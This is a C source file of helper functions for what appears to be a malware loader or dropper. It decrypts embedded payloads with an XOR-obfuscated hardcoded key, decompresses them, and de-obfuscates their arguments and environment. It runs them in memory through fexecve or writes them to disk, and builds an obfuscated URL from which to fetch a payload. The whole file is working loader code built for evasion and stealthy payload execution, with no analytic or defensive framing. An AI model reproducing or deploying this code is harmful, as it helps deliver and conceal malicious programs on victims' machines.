#include "helpers.h"

/*
    Get size in bytes of given file
*/
int fsize(FILE *fp)
{
    int prev = ftell(fp);
    fseek(fp, 0L, SEEK_END);
    int sz = ftell(fp);
    fseek(fp, prev, SEEK_SET); //go back to where we were
    return sz;
}

/*
    Execute payload in memory.
    Return 1 on success, 0 on failure.
*/
int executePayload(int payload_fd, char **payload_argv, char **payload_envp)
{
    if (fexecve(payload_fd, (char *const *)payload_argv, (char *const *)payload_envp) == -1)
    { // execute payload
        return 0;
    }
    return 1;
}

/*
    Simply write payload to given file name
*/
void writeToDisk(void *payload, char *pathToWrite, int size)
{
    FILE *outfile = fopen(pathToWrite, "w");
    fwrite(payload, sizeof(char), size, outfile);
    fclose(outfile);
}

unsigned char *decrypt(unsigned char *encrypted, unsigned int input_length, unsigned int original_size, unsigned char *key)
{
    unsigned char encrypted_msg[input_length - 24];
    unsigned char nonce[24];

    const unsigned int ciphertext_len = original_size + 16;

    unsigned char *decrypted = calloc(original_size, sizeof(unsigned char));

    if (sodium_init() == -1)
    {
        return NULL;
    }

    for (int i = 0; i < input_length; i++)
    {
        if (i > 23)
        {
            encrypted_msg[i - 24] = encrypted[i];
        }
        else
        {
            nonce[i] = encrypted[i];
        }
    }

    if (crypto_secretbox_open_easy(decrypted, encrypted_msg, ciphertext_len, nonce, key) != 0)
    {
        return NULL;
    }

    return decrypted;
}

unsigned char *decompress(unsigned char *decrypted, uLong uncomp_len, uLong compressed_len)
{
    unsigned char *uncompressed = (mz_uint8 *)malloc((size_t)uncomp_len);

    uncompress(uncompressed, &uncomp_len, decrypted, compressed_len);
    free(decrypted);

    return uncompressed;
}

unsigned int extractInt(unsigned char *payload)
{
    unsigned int toRet = (payload[0] | payload[1] << 8 | payload[2] << 16 | payload[3] << 24);
    return toRet;
}

unsigned char *psswdPadding()
{
    int len;
    char pad = '#';
    unsigned char *psswd = malloc(32);
    unsigned char decoded[strlen(ENC_PASSWORD)];

    if (psswd == NULL)
    {
        return NULL;
    }

    len = strlen(ENC_PASSWORD);

    for (int i = 0; i < len; i++)
    {
        decoded[i] = ENC_PASSWORD[i] ^ 0x8F;
    }

    //add padding if necessary
    if (len < 32)
    {
        memcpy(psswd, decoded, len);
        memset(psswd + len, pad, 32 - len);
    }
    else
    {
        memcpy(psswd, decoded, 32);
    }

    return psswd;
}

char *formatURL()
{
    char *alphaNums = "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9";
    char *formattedURL = calloc(strlen(PAYLOAD_URL) + 65, 1);
    int len = strlen(PAYLOAD_URL);

    if (formattedURL == NULL)
        return NULL;

    strcpy(formattedURL, PAYLOAD_URL);

    for (int i = 0; i < 64; i++)
    {
        formattedURL[len] = alphaNums[rand() % 62] ^ 0xF0;
        len++;
    }
    formattedURL[len++] = '\0';
    puts(formattedURL);
    return formattedURL;
}

PayloadStruct *parseMeta(unsigned char **payloadOffset)
{
    PayloadStruct *payloadMeta;
    unsigned int numPayloads;
    unsigned int numArgv;
    unsigned int numEnvp;
    char *currArg;
    char *currEnv;
    unsigned int currLen;

    numPayloads = extractInt(*payloadOffset);
    *payloadOffset += 4;
    payloadMeta = (PayloadStruct *)calloc(numPayloads, sizeof(PayloadStruct)); //allocate array of pointers to point to arrays of payload metadatas

    if (payloadMeta == NULL)
    {
        return NULL;
    }

    for (int i = 0; i < numPayloads; i++)
    { // define metadata arrays
        payloadMeta[i].flags = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numArgv = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numEnvp = extractInt(*payloadOffset);
        *payloadOffset += 4;

        payloadMeta[i].uncompressedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;
        payloadMeta[i].decryptedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;
        payloadMeta[i].encryptedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;

        // extract argv
        payloadMeta[i].argv = calloc(numArgv + 1, sizeof(char *));
        for (int j = 0; j < numArgv; j++)
        {
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4;
            payloadMeta[i].argv[j] = calloc(currLen + 1, sizeof(char));
            memcpy(payloadMeta[i].argv[j], *payloadOffset, currLen);
            payloadMeta[i].argv[j][currLen] = '\0';
            *payloadOffset += currLen;
            for (int k = 0; k < strlen(payloadMeta[i].argv[j]); k++)
            {
                payloadMeta[i].argv[j][k] ^= 0xFE;
            }
        }

        // extract envp
        payloadMeta[i].envp = calloc(numEnvp + 1, sizeof(char *));
        for (int j = 0; j < numEnvp; j++)
        {
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4;
            payloadMeta[i].envp[j] = calloc(currLen + 1, sizeof(char));
            memcpy(payloadMeta[i].envp[j], *payloadOffset, currLen);
            payloadMeta[i].envp[j][currLen] = '\0';
            *payloadOffset += currLen;
            for (int k = 0; k < strlen(payloadMeta[i].envp[j]); k++)
            {
                payloadMeta[i].envp[j][k] ^= 0xFE;
            }
        }
        for (int j = 0; j < 3; j++){
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4 + currLen;
        }

    }
    return payloadMeta;
}